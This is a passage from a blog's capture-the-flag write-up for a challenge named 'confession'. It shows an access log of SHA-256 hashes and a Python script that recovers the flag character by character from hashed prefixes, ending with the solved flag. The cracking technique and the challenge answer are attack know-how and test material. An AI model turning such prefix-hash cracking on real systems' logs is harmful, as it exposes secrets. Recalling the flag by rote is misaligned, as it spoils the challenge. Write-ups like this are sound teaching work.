</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 01:46:58 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "confession",</pre><pre>
</pre><pre class="code">        "args": "{\"hash\":\"c310f60bb9f3c59c43c73ff8c7af10268de81d4f787eb04e443bbc4aaf5ecb83\"}"</pre><pre>
</pre><pre class="code">      },</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">      ...</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">      {</pre><pre>
</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 16:09:08 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "accessLog",</pre><pre>
</pre><pre class="code">        "args": "{}"</pre><pre>
</pre><pre class="code">      }</pre><pre>
</pre><pre class="code">    ]</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>


Now this is interesting. My first through was to use one of the predefined query strings in order to leak the message, but the provided function taking in a hash doesn't return the message, but just the title of the message, so we need to find another solution...

</pre>
            <span id="extracting-the-message"></span>
            <h2><a href="#extracting-the-message">Extracting the message</a></h2>
            <pre>
One of the first things to do when getting a hash, is to throw it into crackstation and find out if it is crackable, so we extract the hashes from the accessLog response and throw the first few into crackstation. We get this as a result:

<img src="./crackstation.png">

As you can see, the first n hashes consist of the first n chars from the flag. Due to crackstations wordlist not knowing the rest of the flag format, it can't show us a result. But we've got the next hashes, so in order to find out what that next char after flag is, we can simply try out all possible combinations (flaga, flagb, ...), hash them and compare the hash with the hash we've got:


</pre><pre class="code">import hashlib</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">hashes = [</pre><pre>
</pre><pre class="code">"252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111",</pre><pre>
</pre><pre class="code">"593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6",</pre><pre>
</pre><pre class="code">"c310f60bb9f3c59c43c73ff8c7af10268de81d4f787eb04e443bbc4aaf5ecb83",</pre><pre>
</pre><pre class="code">"807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87",</pre><pre>
</pre><pre class="code">"0577f6995695564dbf3e17ef36bf02ee73ba10ab300caf751315615e0fc6dd37",</pre><pre>
</pre><pre class="code">"9271dd87ec1a208d1a6b25f8c4e3b21e36c75c02b62fafc48cf1327bac220e48",</pre><pre>
</pre><pre class="code">"95f5e39cb28767940602ce3241def53c42d399ae1daf086c9b3863d50a640a81",</pre><pre>
</pre><pre class="code">"62663931ff47a4c77e88916d96cad247f6e2c352a628021a1b60690d88625d75",</pre><pre>
</pre><pre class="code">"5534607d1f4ee755bc11d75d082147803841bc3959de77d6159fca79a637ac77",</pre><pre>
</pre><pre class="code">"52a88481cc6123cc10f4abb55a0a77bf96d286f457f6d7c3088aaf286c881b76",</pre><pre>
</pre><pre class="code">"7ffcb9b3a723070230441d3c7aee14528ca23d46764c78365f5fdf24d0cdef53",</pre><pre>
</pre><pre class="code">"532e4cecd0320ccb0a634956598c900170bd5c6f1f22941938180fe719b61d37",</pre><pre>
</pre><pre class="code">"a4b24c8f4f14444005c7023e9d2f75199201910af98aaef621dc01cb6e63f1d1",</pre><pre>
</pre><pre class="code">"1092c20127f3231234eadf0dd5bee65b5f48ffbdc94e5bf928e3605781a8c0d1",</pre><pre>
</pre><pre class="code">"1e261929cc13a0e9ecf66d3e6508c14b79c305fa10768b232088e6c2bfb3efa3",</pre><pre>
</pre><pre class="code">"0bb629dfb5bf8a50ef20cfff123756005b32a6e0db1486bd1a05b4a7ddfd16c7",</pre><pre>
</pre><pre class="code">"0141c897af69e82bc9fde85a4c99b6e693f6eb390b9abdeda4a34953f82efa4b",</pre><pre>
</pre><pre class="code">"c20ee107ba4d41370cc354bb4662f3efb6b7c14e7b652394aaa1ad0341e4a1c9",</pre><pre>
</pre><pre class="code">"d6b977c1deb6179c7b9ac11fb2ce231b100cf1891a1102d02d8f7fbea057b8a0",</pre><pre>
</pre><pre class="code">"fb7dc9b1be6477cea0e23fdc157ff6b67ce075b70453e55bb22a6542255093f1",</pre><pre>
</pre><pre class="code">"70b652dad63cabed8241c43ba5879cc6d509076f778610098a20154eb8ac1b89",</pre><pre>
</pre><pre class="code">"26f4fc4aba06942e5e9c5935d78da3512907fe666e1f1f186cf79ac14b82fcad",</pre><pre>
</pre><pre class="code">"c31c26dbbcf2e7c21223c9f80822c6b8f413e43a2e95797e8b58763605aaca0d",</pre><pre>
</pre><pre class="code">"eb992e46fb842592270cd9d932ba6350841966480c6de55985725bbf714a861d",</pre><pre>
</pre><pre class="code">"c21af990b2bd859d99cfd24330c859a4c1ae2f13b0722962ae320a460c5e0468",</pre><pre>
</pre><pre class="code">"ebf2b799b6bf20653927092dae99a6b0fc0094abc706ca1dce66c5d154b4542d",</pre><pre>
</pre><pre class="code">"07a272d52750c9ab31588402d5fb8954e3e5174fcab9291e835859a5f8f34cf9",</pre><pre>
</pre><pre class="code">"5a047cba5d6e0cf62d2618149290180e1476106d71bd9fdb7b1f0c41437c2ff5"</pre><pre>
</pre><pre class="code">]</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">flag = ""</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">for hash in hashes:</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">	# build all hashes for most of the ascii range</pre><pre>
</pre><pre class="code">	for i in range(32, 126):</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">		# define the hash</pre><pre>
</pre><pre class="code">		m = hashlib.sha256()</pre><pre>
</pre><pre class="code">		m.update(str(flag + str(chr(i))).encode("utf-8"))</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">		# if the hash of the guessed char equals the given hash, add the</pre><pre>
</pre><pre class="code">		# char to the flag</pre><pre>
</pre><pre class="code">		if m.hexdigest() == hash.strip("\n"):</pre><pre>
</pre><pre class="code">			print(chr(i), end="")</pre><pre>
</pre><pre class="code">			flag += chr(i)</pre><pre>
</pre><pre class="code">			break</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">print(flag)</pre><pre>

</pre><pre class="code">flag{but_pls_d0nt_t3ll_any1}</pre><pre>


And finally, we get the flag!
<br>
    <br>
    <br>
    </pre>
<a href="https://lieu.cblgh.org/" target="_blank" rel="noopener" class="icon"><img class="webring" src="/lieu.svg" alt="lieu webring search engine" height="32px"/></a>
<a href="https://webring.xxiivv.com/#emile" target="_blank" rel="noopener" class="icon"><img class="webring" src="/webring.svg" alt="XXIIVV webring" height="32px"/></a>
    <pre>
emile - 1667082414.877928s
</body>
</html>
    <pre>